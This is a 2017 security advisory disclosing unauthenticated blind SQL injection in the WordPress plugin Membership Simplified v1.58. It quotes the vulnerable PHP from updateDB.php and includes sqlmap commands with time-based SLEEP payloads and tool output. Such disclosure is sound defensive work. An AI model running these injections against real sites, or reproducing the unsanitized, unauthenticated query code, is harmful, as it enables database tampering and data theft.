=== Content from www.vapidlabs.com_c61e2ce4_20250125_182608.html ===


| Advisory #: 188 |
| --- |
| **Title:** Multiple Unauthenticated blind SQL injections in Wordpress Plugin Membership Simplified v1.58 |
| **Author:** Larry W. Cashdollar, @\_larry0 |
| **Date:** 2017-03-17 |
| **CVE-ID:**[[CVE-2017-1002009](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1002009)][[CVE-2017-1002010](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1002010)] |
| **CWE:** CWE-89 SQL Injection |
| **Download Site:** <http://membership.officeautopilot.com/get-it-now/> |
| **Vendor:** http://membership.officeautopilot.com/ |
| **Vendor Notified:**  2017-03-17 |
| **Vendor Contact:** http://membership.officeautopilot.com/1-58-has-been-released-and-works-with-version-4-5-of-wordpress/#comment-484 |
| **Advisory:** <http://www.vapidlabs.com/advisory.php?v=188> |
| **Description:** Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses. |
| **Vulnerability:**The code in membership-simplified-for-oap-members-only/updateDB.php is vulnerable to blind SQL injection because it doesn't sanitize user input via any of the POST requests being passed into the SQL query. Also it doesn't check that a user is authorized to make updates to the database. 2 require\_once("../../../wp-config.php"); 3 global $wpdb; 4 $table\_name = $wpdb->prefix . "download\_listing"; 5 $media\_table\_name = $wpdb->prefix . "media\_listing"; 6 $action = $\_POST['action']; 7 $updateRecordsArray = $\_POST['recordsArray']; 8 $mediaupdateRecordsArray = $\_POST['mediaRecordsArray']; CVE-2017-1002009: I chose to test the SQL injection against the delete action as it was the most straightforward injection point. 34 if($action == 'delete') { 35 $upload\_base\_dir = wp\_upload\_dir(); 36 $upload\_dir = $upload\_base\_dir['basedir']; 37 $path= $upload\_dir.'/membership-simplified-for-oap-members-only/'; 38 $fileName = $wpdb->get\_row("select fileName from $table\_name where recordId= ".$\_POST['recordId'].""); 39 @unlink($path.$fileName->fileName); 40 $query= "delete from $table\_name where recordId= '".$\_POST['recordId']."' "; 41 $wpdb->query($query) or die('Error, insert query failed'); 42 43 } CVE-2017-1002010: 56 if($action == 'delete\_media') { 57 $upload\_base\_dir = wp\_upload\_dir(); 58 $upload\_dir = $upload\_base\_dir['basedir']; 59 $path = $upload\_dir.'/membership-simplified-for-oap-members-only/'; 60 $fileName = $wpdb->get\_row("select fileName from $media\_table\_name where recordId= ".$\_POST['recordId'].""); 61 //@unlink($path.$fileName->fileName); 62 $query= "delete from $media\_table\_name where recordId= '".$\_POST['recordID']."' "; 65 $wpdb->query($query) or die($query); |
| **Export:** [JSON](export_mitre_v4.py?id=188) [TEXT](txt.php?v=188) [XML](xml.php?s=188) |
| **Exploit Code:** ```   1. $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/updateDB.php' --data 'action=delete&recordId=*' --dbms [mysql](http://www.php.net/mysql)  --level 3 --risk 3 3. (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 4. sqlmap identified the following injection point(s) with a total of 1411 HTTP(s) requests: 5. --- 6. Parameter: #1* ((custom) POST) 7. Type: AND/OR time-based blind 8. Title: [MySQL](http://www.php.net/mysql) >= 5.0.12 time-based blind - Parameter replace (substraction) 9. Payload: action=delete&recordId=(SELECT * FROM (SELECT([SLEEP](http://www.php.net/sleep)(5)))uxVZ) 10. --- 11. [02:10:51] [INFO] the back-[end](http://www.php.net/end) DBMS is [MySQL](http://www.php.net/mysql) 12. web server operating [system](http://www.php.net/system): Linux Ubuntu 16.04 (xenial) 13. web application technology: Apache 2.4.18 14. back-[end](http://www.php.net/end) DBMS: [MySQL](http://www.php.net/mysql) >= 5.0.12 15. [02:10:51] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 17. [*] shutting down at 02:10:51 20. $ sqlmap -u 'http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/updateDB.php' --data 'action=delete_media&recordId=*' --dbms [mysql](http://www.php.net/mysql)  --level 3 --risk 3 22. sqlmap identified the following injection point(s) with a total of 1411 HTTP(s) requests: 23. --- 24. Parameter: #1* ((custom) POST) 25. Type: AND/OR time-based blind 26. Title: [MySQL](http://www.php.net/mysql) >= 5.0.12 time-based blind - Parameter replace (substraction) 27. Payload: action=delete_media&recordId=(SELECT * FROM (SELECT([SLEEP](http://www.php.net/sleep)(5)))ENgw) 28. --- 29. [02:34:49] [INFO] the back-[end](http://www.php.net/end) DBMS is [MySQL](http://www.php.net/mysql) 30. web server operating [system](http://www.php.net/system): Linux Ubuntu 16.04 (xenial) 31. web application technology: Apache 2.4.18 32. back-[end](http://www.php.net/end) DBMS: [MySQL](http://www.php.net/mysql) >= 5.0.12 33. [02:34:49] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/example.com' 35. [*] shutting down at 02:34:49  ``` |
| **Screen Shots:** |
| **Notes:** |


